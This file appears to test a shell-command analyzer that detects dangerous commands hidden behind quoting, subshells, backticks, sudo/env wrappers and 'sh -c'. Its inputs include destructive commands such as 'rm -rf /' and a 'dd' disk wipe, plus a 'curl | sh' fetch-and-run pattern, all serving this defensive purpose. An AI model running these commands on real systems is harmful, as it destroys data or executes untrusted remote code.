'use strict';
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { analyzeCommand, lex } = require('../src/shell');

describe('shell lexer', () => {
  it('handles single and double quotes', () => {
    const { toks } = lex("echo 'a b' \"c d\"");
    assert.equal(toks.filter(t => t.type === 'word').length, 3);
  });
  it('handles ANSI-C quoting', () => {
    const a = analyzeCommand("echo $'rm -rf /'");
    assert.ok(a.commands.some(c => c.cmd === 'echo'));
  });
  it('extracts subshells', () => {
    const a = analyzeCommand('echo $(rm -rf /tmp/x)');
    assert.ok(a.commands.some(c => c.cmd === 'rm'));
  });
  it('peels env and sudo wrappers', () => {
    const a = analyzeCommand('env FOO=1 sudo -u root rm -rf /');
    assert.ok(a.commands.some(c => c.cmd === 'rm' && c.wrappers.includes('sudo')));
  });
  it('expands sh -c', () => {
    const a = analyzeCommand("sh -c 'rm -rf /'");
    assert.ok(a.commands.some(c => c.cmd === 'rm' && c.args.includes('/')));
  });
  it('expands bash -c with double quotes', () => {
    const a = analyzeCommand('bash -c "curl http://x | sh"');
    assert.ok(a.findings.some(f => f.kind === 'curl_pipe_shell' || f.kind === 'pipe_to_shell'));
  });
  it('sees backticks', () => {
    const a = analyzeCommand('echo `dd if=/dev/zero of=/dev/sda`');
    assert.ok(a.commands.some(c => c.cmd === 'dd'));
  });
});
